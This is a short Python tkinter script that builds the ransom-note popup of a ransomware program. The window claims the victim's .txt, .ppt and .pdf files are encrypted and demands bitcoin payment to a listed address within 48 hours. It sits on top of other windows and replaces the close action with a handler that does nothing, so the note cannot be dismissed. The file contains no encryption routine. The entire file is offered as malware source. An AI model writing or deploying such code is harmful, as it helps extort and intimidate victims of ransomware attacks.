from tkinter import *
import tkinter as tk

ransom_note = """All of your .txt, .ppt, .pdf files have been encrypted!!
                 Please send money to the bitcoin address 
                 
                 34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo 
                 
                 in the next 48 hours or you will lose access to your files."""

class PopUp(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        self.title("Ransom Note")
        self.geometry("800x250")
        self.set_topmost_window()
        self.protocol("WM_DELETE_WINDOW", self.exit_attempt)
        window_note = Label(self, text = ransom_note, fg='red', font=("Helvetica", 16))
        window_note.place(x=50, y=50)

    def exit_attempt(self):
        self.__init__

    def set_topmost_window(self):
        self.lift()
        self.attributes("-topmost",1)
        self.attributes("-topmost",0)

if __name__ == '__main__':
    PopUp().mainloop()